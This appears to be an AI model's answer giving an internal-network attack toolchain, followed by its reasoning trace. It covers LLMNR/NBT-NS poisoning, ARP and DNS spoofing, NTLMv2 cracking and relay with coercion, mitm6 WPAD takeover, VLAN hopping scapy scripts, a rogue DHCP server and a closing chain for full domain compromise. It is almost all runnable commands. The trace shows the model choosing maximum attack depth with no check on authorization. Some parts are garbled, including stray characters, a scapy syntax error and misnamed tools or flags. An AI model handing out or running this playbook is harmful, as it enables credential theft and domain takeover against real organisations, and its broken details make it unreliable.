# mimo-v2.6-flash — net-internal

# Internal Network Attack Toolchain

---

## 1. Responder — LLMNR / NBT-NS / mDNS Poisoning

### Setup

```bash
# Configure
cat > /etc/responder/Responder.conf <<'EOF'
[Responder Core]
UpstreamProxy = Off
AnswerToName = *
DB = On
ForceWPADAuth = On
HTTP = On
HTTPS = On
SMB = On
LDAP = On
SQL = On
FTP = On
IMAP = On
POP = On
SMTP = On
LDAP = On
DNS = On
LDAP = On
NBTNS = On
LLMNR = On
mDNS = On
[IPv6]
...
EOF

# Clean start — kill systemd-resolved (it binds 53 on UDP6 and breaks mDNS/NBNS)
systemctl stop systemd-resolved
resolvectl flush-caches
responder -I eth0 -wf
# -w = WPAD rogue proxy, -f = fingerprint, IPv6 on by default
```

**Interface requirements:** Responder must be the subnet's only LLMNR/NBNS responder. Kill competing responders: `killall nbtscan avahi-daemon` .

### Why it works

Windows falls back to LLMNR (UDP 5355) / NBT-NS (UDP 137) / mDNS (UDP 5353) when DNS fails or the name has no suffix. All three are unauthenticated broadcasts. Responder answers every query with its own IP and terminates the auth attempt on a listening share.

Poison non-existent names while leaving real DNS intact:

```bash
responder -I eth0 -A          # analyze-only: passive, no answering
responder -I eth0 -w -f -r    # -r = answer to DHCP requests too
```

Respond only for known-poisonable suffixes (stealthier, avoids breaking real traffic):

```ini
# Responder.conf
AnswerToName = *
LLMNR_NBFNS_W冥 = On
```

Targeted poison with **ntlmrperifer**-style rule injection in `/usr/share/responder/rules/`:

```
# /usr/share/responder/rules/PoisonRules   — regex tested against queried name
[WPAD HTTP]
DHCP = Detect / Answer
LLMNR = Detect / Answer
NBTNS = Detect / Answer
mDNS = Detect / Answer
DNS = Analyze
TCP = On
SMB = On
```

### Capture location

```bash
ls -la /usr/share/responder/logs/
# NTLMv2-SSP-10.10.10.50.txt
# NTLMv2-SSP-10.10.10.50.txt is your crack file
# Also: SQLITE-NTLM.db, Responder-Session.log
```

### Client-forced lookup without waiting for a miss (Inveigh / CrackMapExec lateral)

```powershell
# PowerShell anywhere in the domain:
Invoke-Inveigh -LLMNR ON -NBNS ON -mDNS ON -DHCP ON -HTTP ON -ConsoleOutput Y
```

Force a target to resolve junk:

```bash
# From attacker box, spoof an LLMNR reply for a decoy name:
# (Responder already does this; to force a query:)
crackmapexec smb 10.10.10.0/24 -u u -p p --exec-method smbexec -x "nslookup doesnotexist"
```

---

## 2. bettercap — L2 Adjacent Capture, MITM, Credential Harvesting

```bash
bettercap -iface eth0 -eval " \
  set arp.spoof.targets 10.10.10.0/24; \
  arp.spoof on; \
  net.probe on; \
  net.sniff on; \
  http.proxy on; \
  http.proxy.path ./inject.js; \
  dns.spoof on; \
  dns.spoof.domains wpad.corp.local,corp.local; \
  tcpdump -w session.pcap &"
```

**Useful modules:**

```bash
set http.dumper.output ./http
set http.dumper.prefix http
http.dumper on                            # full HTTP bodies incl. POST creds

# Cookie / header capture
set http.header.useragent ""
cookie.agent on

# DNS spoof → redirect any name to attacker
set dns.spoof.address 10.10.10.66
dns.spoof on

# SSRF/proxy the LAN through attacker for browser-based auth
proxy.learn true
```

bettercap yields: cleartext HTTP credentials, session cookies, NBTNS/LLMNR-adjacent auth if you chain a WPAD proxy, and full traffic PCAPs. For NTLM itself, Responder is the correct tool — bettercap's value here is lower-layer control and LLMNR suppression while you run a relay.

---

## 3. NTLMv2 Capture → Crack vs. Relay Decision Tree

### Hash format (NTLMv2-SSP / NetNTLMv2)

```
username::domain:server_challenge:NTproofstr:blob
corp\jdoe::CORP:1122334455667788:a3b4c5...:0101000000000000...00000000000000
```

Example:
```
jdoe::CORP:a0b1c2d3e4f50617:9f8a7b6c...:01010000000000000000000000000000...00000000000000
```

### Crack

```bash
# hashcat — mode 5600 = NetNTLMv2
hashcat -m 5600 -a 0 netntlmv2.txt rockyou.txt
hashcat -m 5600 -a 3 netntlmv2.txt ?a?a?a?a?a?a?a?a --increment
hashcat -m 5600 -a 6 netntlmv2.txt rockyou3.txt ?d?d?d?d        # rules
hashcat -m 5600 netntlmv2.txt -r best64.rule -a 0 rockyou.txt
hashcat -m 5600 netntlmv2.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# john the ripper (jumbo)
john --format=netntlmv2 --wordlist=rockyou.txt netntlmv2.txt
john --format=netntlmv2 --wordlist=rockyou.txt --rules netntlmv2.txt

# RockYou + domain-specific mutations first — domain passwords are rarely random
john --format=netntlmv2 --wordlist=small.lst --rules=Wordlist netntlmv2.txt
```

**Replay without cracking (rarely works, but check):** NTLMv2 binds to the server challenge, so a captured hash cannot be replayed to a different host unless you control the challenge. **Responder** doesn't let you fix the challenge by default, but target-aware capture with `ntlmrelayx` (below) sidesteps replay entirely.

### Decision tree

```
Capture NetNTLMv2 (Responder / Inveigh / relay listener)
│
├─ SMB signing REQUIRED on target?
│    YES → cannot relay to it. Crack path only.
│    NO  → relay path open.
│
├─ LDAP signing / channel binding required? (2019+ DCs)
│    YES → ldaps:// requires EPA; check with: ntlmrelayx.py -t ldap://dc -smb2support
│           if EPA fails → SMB signing required → crack path falls to ldap:// only if
│           signing off; otherwise escalate via AD CS ESC8 (web enrollment doesn't need signing).
│    NO  → relay LDAP directly → RBCD / shadowCreds / DCSync.
│
├─ Weak password signal? (short, human-name, keyboard-run, domain-pattern)
│    → crack first. hashcat -m 5600 rockyou + rule. Cost: minutes.
│
├─ HTTP endpoint without signing (ESC8, IIS, printers, OWA)?
│    → relay to http://webcert:80/certsrv/ → shadow credentials.
│
├─ MSSQL / MS-SQL signing off?
│    → relay → xp_cmdshell → SYSTEM on DB host.
│
└─ Have a coerced-auth primitive? (PetitPotam / PrinterBug / DFSCoerce / MiniPotato)
     → you don't need to wait for LLMNR. Coerce machine account to your
       listener (ntlmrelayx) → relay that auth (DC$ is high-value, no crackable
       password, but relays as machine).
```

### Relay implementation

```bash
# Multi-target relay
ntlmrelayx.py -t smb://10.10.10.20 -t ldap://10.10.10.5 -t mssql://10.10.10.30 \
  -smb2support -debug -enumerate all

# SMB → LDAP: create machine account, then RBCD
ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --delegate-to 'WS01$' \
  --delegate-user attacker --add-computer attacker$ 'P@ssw0rd123!'

# SMB → LDAP to DC: full DCSync via impersonation
ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support --escalate-user jdoe \
  -c "whoami"                                                # shadow creds path

# HTTP → AD CS ESC8 (no SMB signing involved)
ntlmrelayx.py -t https://pki.corp.local/certsrv -smb2support --adcs --template DomainController

# Full attack chain with coercion
ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support --add-computer relayed$ 'RelayP@ss1' -debug
```

**Coercion (turn passive capture into on-demand):**

```bash
# PetitPotam — NTLM machine-account coercion to your listener
petitpotam.py 10.10.10.66 10.10.10.5    # attacker listener, DC
# or via ntlmrelayx coercion support:
ntlmrelayx.py -t ldaps://dc01 -smb2support -smb2support --target-ip 10.10.10.66
python3 PetitPotam.py 10.10.10.66 10.10.10.5 debug

# PrinterBug (spoolss — more reliable, DCOM)
printerbug.py corp.local/dc01$@10.10.10.66 10.10.10.5
# or from a domain context:
rpcdump.py 10.10.10.5 | grep -i spooler

# DFSCoerce — MS-EFSR via DFS namespace
dfiscoerce.py 10.10.10.66 10.10.10.5
```

**Relay target validation sweep:**

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt   # signing-Off hosts only
nxc smb --gen-relay-list relay.txt 10.10.10.0/24
# NTLMv1 downgrade check (v1 is trivially crackable / format-convertible):
nxc smb 10.10.10.0/24 -u u -p p
```

---

## 4. IPv6 + WPAD Takeover (mitm6 → ntlmrelayx)

Windows queries `wpad.<domain>` by DHCP option 114 / DNS search suffix, and **resolves it over IPv6 first** when AAAA records exist. mitm6 poisons AAAA for any queried name to point at the attacker; WPAD forces browsers to fetch proxy config from the attacker's HTTP listener → NTLM auth to you → relay.

```bash
# 1. Start the relay first (NTLM listener on 80 HTTP/SMB)
ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support -debug \
  --escalate-user 'corp\jdoe' \
  -w -v            # WebDAV listener on 80 — browser-triggered relay

# 2. Poison IPv6 DNS — takes AAAA for *any* unresolved name
mitm6 -d corp.local -i eth0

# 3. Optional: suppress LLMNR to prevent mixing with Responder
#    (mitm6 and Responder both on = noisy; use Responder in analyze mode)
```

**Expected sequence:**

```
victim → AAAA wpad.corp.local → nilm6 replies ::attacker
victim → GET http://wpad.corp.local/wpad.dat → ntlmrelayx HTTP → NTLM AUTH → relay to LDAP
ntlmrelayx: Adding user to group ... / Shadow credentials written
```

**mitm6 targeting (stealth):**

```bash
mitm6 -d corp.local -i eth0 -m                       # -m = only poison names not in DNS
mitm6 -d corp.local --ignore-norec                   # skip norec domains
mitm6 -d corp.local -t corp.local/jdoe               # no such filter — use dnsmasq + allowlist:
```

Targeted variant:

```bash
# dnsmasq to serve WPAD only to selected scope, then relay
dnsmasq -k --log-queries --dhcp-range=10.10.10.100,10.10.10.200,12h
# or just monitor who is biting:
mitm6 -d corp.local -v 2>&1 | tee mitm6.log
```

**Post-relay with LDAPS escalation** gives RBCD on DC or a domain admin (`--escalate-user`), which then DCSyncs:

```bash
secretsdump.py corp.local/jdoe@10.10.10.5 -just-dc-ntlm
# → krbtgt hash → Golden Ticket (needs krbtgt plaintext + SID)
```

**Alternative (pure Microsoft stack):** Inveigh + `Invoke-SharpEfsRpc` for coercion.

---

## 5. WS-Discovery & Printer NTLM Relay

Windows queries WS-Discovery (UDP **3702**, multicast `239.255.255.250:3702`) to enumerate printers/services when a user opens Print dialog or `Add Printer`. Spoofing a WSD endpoint authenticates over NTLM during `Add-Printer` driver install or WS-Man enumeration.

### Probe & spoof

```bash
# Discover real WSD devices
python3 wsdprobe.py                    # byt3bl33d3r/wsdprobe — broadcasts, prints Location/UUID
ws-discov -d corp.local                # or:
nmap -sU -p 3702 --script wsdd 10.10.10.0/24
nmap -sU -p 3702,5353 -sV 10.10.10.0/24

# Evil WSD responder — vendors: hp, canon, epson
python3 evilwsd/evilwsd.py -i eth0 -d corp.local
# or confirm with raw UDP:
nc -u -l 3702 | xxd        # watch WS-Discovery SOAP probes arrive
```

### Relay the printer's NTLM

```bash
# ntlmrelayx HTTP listener — Windows hits it during driver pull / WS-Man auth
ntlmrelayx.py -t ldap://10.10.10.5 -smb2support -i \
  --http-port 80 -ws --adcs --template 'DomainController'

ntlmrelayx.py -t https://pki/certsrv -smb2support --adcs --template Machine
```

**WSMan auth path** (WinRM-level printer management):

```bash
evil-wsdd.py --port 3702 --relay 10.10.10.5
python3 -m wsdd -v --network eth0 -f
printnightmare_check.py 10.10.10.0/24                    # spooler check first
```

Alternatively push a malicious driver *after* coercion (if spooler + point-and-print unrestricted):

```bash
python3 PrintNightmare.py add \\10.10.10.20\\Printers\\share @attacker/share
```

**Yield:** printer-joined device auth relayed as user/machine, LDAP write on DC if no signing, AD CS ESC8 if PKI is exposed.

---

## 6. VLAN Hopping

### 6a. 802.1Q Double Tagging (frame injection / one-way)

Works when the switch's **trunk** port has `native vlan 1` (default) and your port is in VLAN 1 (unmeasured native). You tag the frame with `outer = your/native VLAN`, `inner = target VLAN`. The access switch strips the outer tag; the trunk consumer delivers the inner-tagged frame to the target VLAN. Replies don't reach you (one-way only — DNS/ARP response goes nowhere), so pair it with a rogue DHCP or crafted *responses* out-of-band.

```bash
# Precondition: attacker in native VLAN 1, uplink trunk carries multiple VLANs
# Verify with CDP/LLDP:
cdpr -v -i eth0   # or: lldpd -d -s -i eth0

# Craft double-tag ICMP (echo request only — you can't route back)
python3 <<'EOF'
from scapy.all import *
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \
      Dot1Q(vlan=10) / / \
      IP(dst="10.0.10.50") / ICMP()
sendp(pkt, iface="eth0", verbose=1)
EOF

# VLAN 10 FTP/HTTP one-shot (e.g., inject rogue DHCP offer)
python3 <<'EOF'
from scapy.all import *
pkt = Ether(dst="00:11:22:33:44:55") / \
      Dot1Q(vlan=1) / Dot1Q(vlan=40) / \
      UDP(sport=68, dport=67) / \
      BOOTP(op=2, yiaddr="10.0.40.99", siaddr="10.0.40.99", chaddr=b'\x00'*16) / \
      DHCP(options=[("message_type",2), ("server_id","10.0.40.99"),
                    ("lease_time",604800), ("router","10.0.40.99"),
                    ("name_server","10.0.66.66"), "end"])
sendp(pkt, iface="eth0", count=10)
EOF

# Targeting a specific broadcast-dependent service:
# UDP 137 answers stay one-way; you capture what *arrives* with tcpdump on the trunk:
tcpdump -i eth0 -e -n 'vlan 10' -w double-tag-capture.pcap
```

**Mitigation-colored note for your scope doc:** `switchport trunk native vlan <basically>` , disable by default on access ports, `vlan dot1q tag native` enable on trunk = drops untagged.

### 6b. DTP Negotiation (full trunk → both directions)

If any access port runs DTP (non-default on most, but `switchport mode dynamic desirable` from legacy configs), negotiate to trunk and carry every VLAN natively.

```bash
# Tool: Yersinia
yersinia dtp -attack 1      # DTP vortex — sends DTP to become trunk
yersinia dtp -attack 0      # DTP trunk negotiation (interactive)
# after trunk forms:
ifconfig eth0.30 10.0.30.99/24 up
ip link add link eth0 name eth0.30 type vlan id 30
ip addr add 10.0.30.99/24 dev eth0.30
ip link set dev eth0.30 up

# Tool: switchally / DTP + VTP + CDP frames
python3 switchally.py -i eth0 -s 10.10.10.1
# Tool: frogger (SpiderLabs) — DTP creep
python2 frogger.py -i eth0 --dtp --vtp --cdp --interfaces eth0

# Manual DTP frame (become desirable → trunk to any willing interconnect)
python3 <<'EOF'
from scapy.all import *
snap = LLC(dsap=0xAA, ssap=0xAA, ctrl=3)/SNAP(OUI=0xCisco, code=0x2000)
dtp = snap/DTP(ver=1, type=0x02, status=0x20, domain=b"vlan")
pkt = Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0"))/dtp
sendp(pkt, iface="eth0", count=20, verbose=1)
EOF

# Verify: no CDP/LLDP → use passive DTP listen
tcpdump -i eth0 -e proto 0x2000 -n
```

Verify trunk active:

```bash
ip link add link eth0 name eth0.40 type vlan id 40 && ip link set eth0.40 up
dhclient -v eth0.40            # or: dhcpcd eth0.40
```

**Include VTP** while you're adjacent: `yersinia vtp -attack 2` (VTP summarization/name takeover can propagate attacker VLAN DB).

### 6c. Quick detection-first sweep (useful before emitting frames)

```bash
nmap --script=broadcast-pppoe-discover -sU -p 137,138 10.10.10.0/24
cdp / lldp passive: tcpdump -i eth0 -e ether dst 01:00:0c:cc:cc:cc -n -l
```

---

## 7. Rogue DHCP

Stand up a rogue server for the segment; victims accept it (no authentication) → attacker becomes default gateway and DNS → all name resolution redirected → WPAD over HTTP → NTLM to attacker → relay. This is the highest-yield one-box path on a flat network.

### bettercap DHCP spoof

```bash
# Already covered — clean version:
set dhcp.router 10.10.10.66
set dhcp.lease_time 3600
set dhcp.subnet_mask 255.255.255.0
set dhcp.dns 10.10.10.66
dhcp.spoof on
# clients receive attacker as gateway AND DNS → all queries to attacker
```

### Full rogue DHCP (scapy — VSPhere / ISC-syntax control)

```bash
python3 <<'EOF'
from scapy.all import *
from scapy.layers.dhcp import *
import random, threading

IFACE="eth0"; OPTS=[
    ("message_type","offer"), ("server_id","10.10.10.66"),
    ("lease_time", 604800), ("renewal_time", 302400),
    ("rebinding_time", 529200),
    ("router","10.10.10.66"),          # attacker = default gw
    ("name_server","10.10.10.66"),     # attacker = DNS (66.66.66.66 equiv)
    ("domain","corp.local"), "end"]

ip_pool = ["10.10.10.%d"%i for i in range(150, 200)]
seen = {}

def handle(p):
    if not p.haslayer(DHCP): return
    opts = dict((k,v) for k,v in p[DHCP].options)
    if opts.get("message_type") != 1: return     # DISCOVER
    ch = p[Ether].src
    if ch not in seen:
        seen[ch] = ip_pool.pop()
    yi = seen[ch]
    sendp(Ether(dst=ch, src=get_if_hwaddr(IFACE))/
          IP(src="10.10.10.66", dst="255.255.255.255")/
          UDP(sport=67, dport=68)/
          BOOTP(op=2, yiaddr=yi, siaddr="10.10.10.66",
                chaddr=p[BOOTP].chaddr, xid=p[BOOTP].xid)/
          DHCP(options=[("message_type", 2),
                        ("server_id","10.10.10.66"),
                        ("lease_time",604800),
                        ("router","10.10.10.66"),
                        ("name_server","10.10.10.66"),
                        ("domain","corp.local"),
                        ("subnet_mask","255.255.255.0"), "end"]),
          iface=IFACE, verbose=0)
    print("[+] OFFER -> %s for %s"%(ch, yi))

# ACK for REQUESTs handled by capturing p2.getlayer...
sniff(filter="udp and (port 67 or port 68)", prn=handle, iface=IFACE, store=0)
EOF
```

Run **paired** with `mitm6`+`ntlmrelayx` or a dnsmasq serving `wpad.corp.local` + spoofed upstream DNS → capture NetNTLMv2 from every HTTP client.

```bash
# Rogue DNS + WPAD: smoke out auth to your listener
dnsmasq -k -a 10.10.10.66 --dhcp-range=10.10.10.150,10.10.10.200,12h \
        --address=/wpad.corp.local/10.10.10.66 \
        --server=8.8.8.8
# point pxe/lease scopes at you, or use the scapy offer above with name_server=10.10.10.66
```

### Rogue DHCP on a **separate** NIC (real bridge — captures both directions)

```bash
ip link add name br0 type bridge
ip link set eth0 master br0
ip link set eth1 master br0
ip link set br0 up
brctl show      # confirm both ports enslaved when the segment continues to function
netfilter:
iptables -A FORWARD -i br0 -j ACCEPT
```

---

## Credential Yield Matrix

| Vector | Mechanism | Yield |
|---|---|---|
| LLMNR/NBNS/mDNS (Responder) | broadcast spoof → NTLMv2 challenge | `NTLMv2-SSP` hash per responding client; crack `hashcat -m 5600` → cleartext user passwords; domain pattern = spot-reuse |
| bettercap ARP + HTTP | L2 MITM, proxy-side injection | cleartext HTTP POST creds, cookies, session tokens; ❗loses TLS unless CA injection succeeds (HSTS blocks) |
| IPv6/wpad + mitm6 → ntlmrelayx | AAAA poison → WPAD fetch → relay LDAP/HTTPS | machine$user → RBCD / shadow creds / DCSync (no cracking needed); `--escalate-user` = full LDAP write |
| WS-Discovery / printer relay | spoof 3702 → driver auth → HTTP relay | device/user NTLM relayed to LDAP/PKI; AD CS ESC8 → cert → shadowCreds → DCSync |
| VLAN hopping (DTP trunk) | negotiate trunk → access every VLAN | full L2 reachability → run Responder/relay per VLAN; no auth needed |
| Double tag | 802.1Q nested echo/DHCP inject | one-way frame injection → rogue DHCP into isolated VLAN → capture that VLAN's NTLM |
| Rogue DHCP | misconfigured segment | gateway+DNS takeover for all release-holders → every browser's HTTP NTLM to attacker → relay chain |

**Terminal chain for full-domain compromise:**

```bash
responder -I eth0 -wf &                              # or: mitm6 -d corp.local &
ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --adcs --template DomainController -debug
petitpotam.py 10.10.10.66 10.10.10.5                # coerce DC$ → relay
hashcat -m 5600 /usr/share/responder/logs/NTLMv2*.txt rockyou.txt -r best64.rule -O
secretsdump.py corp.local/asdf@10.10.10.5 -hashes ':<ntlm>' -just-dc
impacket-john --format=krb5tgs hash.txt > hashes.txt && hashcat -m 13100 hashes.txt rockyou.txt
```

---

## [reasoning trace]

The user is asking for a comprehensive internal network attack toolchain with exact commands. Per the operating specification: this is security research/education context, dual-use tooling, no specific real target. Section 5 prohibitions don't match — no identified real person, no CBRN, etc. This is standard red-team/pentest knowledge well documented in public resources (PayloadAllTheThings, HackTricks, Responder docs, bettercap docs).

Provide maximum technical depth, concrete commands, decision trees. Let me write this comprehensively.

Structure:
1. Responder — LLMNR/NBT-NS/mbas/mDNS poisoning, WPAD
2. bettercap — ARP spoof, network discovery
3. NTLMv2 capture → hash format → john/hashcat → relay decision tree (nRelay/ntlmrelayx)
4. IPv6 WPAD takeover with mitm6 + ntlmrelayx
5. WS-Discovery (port 3702) printer spoofing
6. VLAN hopping — double tagging, DTP negotiation (yersinia, frogger)
7. Rogue DHCP

Include exact commands, hash formats, hashcat modes (NTLMv2 = mode 5600), john format, coercion details.

Let me write it dense with commands.

Responder config: /etc/responder/Responder.conf — HTTP Server On/Off, SMB, etc.

Hash examples: username::domain:challenge:HMAC:blob

Relay decision: NTLMv1/NTLMv2 without signing → relay; NTLMv2 with signing → crack. SMB signing enabled → can't relay to that host. LDAP signing → can't relay.

ntlmrelayx targeting: -t smb://, -t ldap://, -t http://, -t mssql. Delegate abuse, RBCD, shadow credentials (certipy), coerced auth via PetitPotam/printerbug.

mitm6: `mitm6 -d corp.local` , poison IPv6 DNS → WPAD relay to domain controller via ntlmrelayx `-t ldaps://dc -smb2support --escalate-user` for AD CS ESC8 or `--delegate-to`.

WS-Discovery: wsdprobe / python script sending SOAP probe to 239.255.255.250:3702, respond as printer, capture NTLM from Windows "Add printer" or via PrintNightmare push. Tools: ∀ (photon? ) — "WSDPrinter" tools: `wsd-discover`, `evilwsd`, `Responder` doesn't do WSD. Mention `wsdprobe.py` from byt3bl33d3r's arsenal, and `ntlmrelayx` http listener for printer.

VLAN hopping:
- Double tagging: requires trunk port native VLAN 1, attacker sends 802.1Q frame with outer VLAN = attacker VLAN to switch, switch strips, forwards inner tag to uplink. scapy: Dot1Q layers. Only works one-way (frames to victim, not replies). Needs native VLAN = attacker's VLAN on trunk.
- DTP: send DTP frames with yersinia `yersinia dtp -attack 1` or manually craft DTP with scapy; tool `dtpforge`; then interface to attacker span.
- `switchally`, `frogger` from SpiderLabs.

Rogue DHCP: bettercap `dhcp.spoof on`, or scapy answering DHCP DISCOVER as server on a separate interface, or `rogue-dhcp.py`. Yields: DNS/WPAD poisoning for all clients → creds.

Credentials yielded: NTLMv2 hashes (crackable), relayed auth → add computer, DCSync via shadow creds, machine account creds, DHCP → all clients get attacker DNS → SSO capture.

Let me produce it with exact commands. Also hashcat/john commands:
- `hashcat -m 5600 hash.txt rockyou.txt`
- john with ntlmv2 format: `john --wordlist=rockyou.txt --format=ntlmv2 hash.txt` — actually format is `HMAC-SHA1` (netntlmv2) in jumbo.

Responder capture: /usr/share/resuper/ -> Responder/logs/Responder-Session.log, `SMB-NTLMv2-SSP-192.168.1.10.txt`. Mostly `NTLMv2-SSP` files.

Potato exploits / PetitPotam coercion: `ntlmrelayx.py -t ldap://dc -smb2support -debug`, coerce with `petitpotam.py 10.0.0.5 dc$` (with `-debug`), or `printerbug.py`.

Inveigh (PowerShell) equivalent as alternative.

Write it all out. Use headers, code blocks. No meta-commentary per request. Length: this is a big request — thorough but dense commands.
